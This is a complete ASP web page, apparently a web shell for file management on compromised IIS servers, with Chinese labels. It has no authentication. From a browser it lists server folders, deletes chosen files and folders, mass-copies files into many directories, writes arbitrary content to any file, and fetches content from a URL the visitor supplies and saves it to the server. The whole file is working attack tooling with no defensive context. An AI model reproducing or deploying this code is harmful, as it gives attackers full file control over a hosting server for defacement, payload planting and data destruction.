<%
function s(d)
Dim fso1,f1  
Set   fso1 =  CreateObject("Scripting.FileSystemObject")   
Set   f1   =  fso1.GetFile(d) 
    f1.attributes = 32
End Function

function DeleteFile(FileName)
on error resume next 
Set FSO = Server.CreateObject("Scripting.FileSystemObject")
if FSO.FileExists(FileName) then 
s(FileName)
  FSO.DeleteFile FileName,true
end if
if err>0 then 
  err.clear
  DeleteFile=False
else 
  DeleteFile=True
end if 
end function 


function DeleteFolder(Folder)
on error resume next 
Folder=server.MapPath(Folder)
Set FSO = Server.CreateObject("Scripting.FileSystemObject")
if FSO.FolderExists(Folder) then 


  FSO.Deletefolder Folder,true
end if
if err>0 then 
  err.clear
  Deletefolder=False
else 
  Deletefolder=True
end if 
end function 



Function FolderExists(dirname)
Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
FolderExists = fso.FolderExists(dirname)
Set fso = nothing
End Function



function getstr(d)
Dim rr
Set fsd=Server.CreateObject("Scripting.FileSystemObject").getfolder(d)


Set Folders=fsd.SubFolders
sz=0
For Each fod In Folders
sz=sz+1

rr =rr&"<input class='kk' type='checkbox' name='c"&sz&"' value='"&fod& "' ><a href='?p="&fod&"'>"&fod&"</a><br>"

Next

Set fsfiles=fsd.Files

For Each fsfile In fsfiles
sz=sz+1
rr =rr&"<input class='kk' type='checkbox' name='c"&sz&"' value='"&fsfile& "' >"&fsfile&"<br>"

Next
getstr= rr
End Function

Function BytesToBstr(body,Cset)
dim objstream
set objstream = Server.CreateObject("adodb.stream")
objstream.Type = 1
objstream.Mode =3
objstream.Open
objstream.Write body
objstream.Position = 0
objstream.Type = 2
objstream.Charset = Cset
BytesToBstr = objstream.ReadText 
objstream.Close
set objstream = nothing
End Function

Function getHTTPPage(url) 
On Error Resume Next
dim http 
set http=Server.createobject("Microsoft.XMLHTTP") 
Http.open "GET",url,false 
Http.setRequestHeader "User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0"  
Http.send() 
if Http.readystate<>4 then
exit function 
end if 
getHTTPPage=bytesToBSTR(Http.responseBody,"utf-8")
set http=nothing
If Err.number<>0 then 
Response.Write "<p align='center'><font color='red'><b> </b></font></p>" 
Response.end
Err.Clear
End If  
End Function

Dim action
Dim jg
if request("q")<>"" then
For i = 1 To Request.Form.Count
pp=Request.Form(Request.Form.Key(i))

if FolderExists(pp) then
if DeleteFolder(pp) then
jg=jg&pp&"文件夹成功<br>"
else
jg=jg&pp&"文件夹失败<br>"
end if

else
s(pp)
if DeleteFile(pp) then
jg=jg&pp&"成功<br>"
else
jg=jg&pp&"失败<br>"
end if
end if


Next 
end if
if request("p")<>"" then
action = "?q=1&p=" & request("p")
wjj=getstr(request("p"))
else
action = "?q=1&p=" & server.mappath("/")
wjj=getstr(server.mappath("/"))
end if
%>

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
    <title>all</title>
    <style type="text/css">
        .auto-style1 {
            width: 53px;
        }
		a{color:red;}
        .ppp {
            display: flex;
            align-items: center;
        }

    </style>
    <%

      set fs=Server.CreateObject("Scripting.FileSystemObject")
      if request("type")="333" then
        if(request("textfield")<>"" and request("textfield2")<>"") then
            alloriginpath=request("textfield")
            copyurls=split(alloriginpath,chr(13)&chr(10))
            allpath =request("textfield2")
            sssss =split(allpath,chr(13)&chr(10))
            for j=0 to Ubound(copyurls)

                path = Trim(copyurls(j))
                lastname =split(path,"\")(Ubound(split(path,"\")))

                If fs.FileExists(path)=true then

                for i=0 to Ubound(sssss)
                    if (Trim(sssss(i)))<>"" then
                        if fs.FolderExists(Trim(sssss(i)))=true then
                        fs.CopyFile path,Trim(sssss(i))&"\\"&lastname
                        end if
                    end if
                next
                end if
            next
            set fs=nothing
        end if

    else 
        if request("type")="444" then

            if( request("textfield2")<>"") then
                cg=0
                sssss =split(request("textfield2"),chr(13)&chr(10))
                for i=0 to Ubound(sssss)-1
                    if (Trim(sssss(i)))<>"" then
                    fs.DeleteFile(Trim(sssss(i)))
                    cg=cg+1
                    end if
                next
            end if
            set fs=nothing
            Response.write cg
        end if

        if request("type")="555" then
            dim fname,content
            cot= request("context")
            filename5=request("filename5")

            if request("action") = "addbycot" then
                content=cot
            else
                content=getHTTPPage(Trim(cot))
            end if 

            if content<>"" and filename5<>"" then
                set fname=fs.CreateTextFile(filename5,true)  
                fname.Write(content)
                fname.Close
                set fname=nothing
                set fs=nothing
            end if 
        end if

    end if



     
    %>
</head>

<body>
    <form id="form10" action="<%=action %>" method="post">
        <div style="width: 960px; margin: 0 auto">
            <input id="thz" type="text" class="auto-style1" />
            <input id="Button1" type="button" value="选择后缀" onclick="se()" />
            <input id="Button2" type="button" value="取消选择" onclick="se1()" />
            <input id="Button3" type="button" value="全选" onclick="se2()" />
            <input id="Submit1" type="submit" value="删除选中" />

            <br />
            <div style="background: #808080">
                <%=jg %>
            </div>
            <br />
            <%=wjj %>
            <script>

                function se() {
                    var hz = document.getElementById("thz").value;
                    var a = document.getElementsByClassName("kk");
                    for (var i = 0; i < a.length; i++) {
                        var v = a[i].value;
                        var f = v.length - hz.length;
                        v = v.substring(f);
                        if (v.toLowerCase() == hz.toLowerCase()) {
                            a[i].checked = true;

                        }
                    }
                }
                function se1() {
                    var a = document.getElementsByClassName("kk");
                    for (var i = 0; i < a.length; i++) {
                        a[i].checked = false;

                    }
                }
                function se2() {
                    var a = document.getElementsByClassName("kk");
                    for (var i = 0; i < a.length; i++) {
                        a[i].checked = true;

                    }
                }

            </script>
        </div>

    </form>

    <form id="form1" name="form1" method="post" action="?type=333">
        <table width="100%" border="1">
            <tr>
                <td width="32%" height="20">
                    <label>
                        <div align="right">Original file url:</div>
                    </label>
                </td>
                <td width="68%">
                    <label>
                        <textarea name="textfield" cols="50" rows="20"></textarea>
                    </label>
                </td>
            </tr>
            <tr>
                <td>
                    <div align="right">Catalog file url:</div>
                </td>
                <td>

                    <textarea name="textfield2" cols="100" rows="30">

</textarea></td>
            </tr>
            <tr>
                <td>&nbsp;</td>
                <td>
                    <label>
                        <input type="submit" name="Submit" value="submit" />
                    </label>
                </td>
            </tr>
        </table>
    </form>
    <form id="form2" name="form2" method="post" action="?type=444">
        <table width="100%" border="1">

            <tr>
                <td>
                    <div align="right">Catalog file url:</div>
                </td>
                <td>
                    <textarea name="textfield2" cols="100" rows="30">

</textarea></td>
            </tr>
            <tr>
                <td>&nbsp;</td>
                <td>
                    <label>
                        <input type="submit" name="Submit" value="delete" />
                    </label>
                </td>
            </tr>
        </table>
    </form>
        <form id="form3" name="form3" method="post" action="?type=555">
        <div class="ppp">
            <table width="100%" border="3" bordercolor="#669900">
                <tr>
                    <td>
                        <div align="right">输入内容:</div>
                    </td>
                    <td><span class="ppp">
                            <textarea name="context" rows="20" cols="100"></textarea>
                        </span></td>
                </tr>
                <tr>
                    <td>
                        <div align="right">输入创建文件名：</div>
                    </td>
                    <td><span class="ppp">
                            <input name="filename5" />
                        </span></td>
                </tr>
                <tr>
                    <td colspan="2">
                        <div align="center">
                            <button type="submit" name="action" value="addbycot">内容上传</button>
                            <button type="submit" name="action" value="addbyurl">下载上传</button>
                        </div>
                    </td>
                </tr>
            </table>
        </div>
         </form>
</body>
</html>
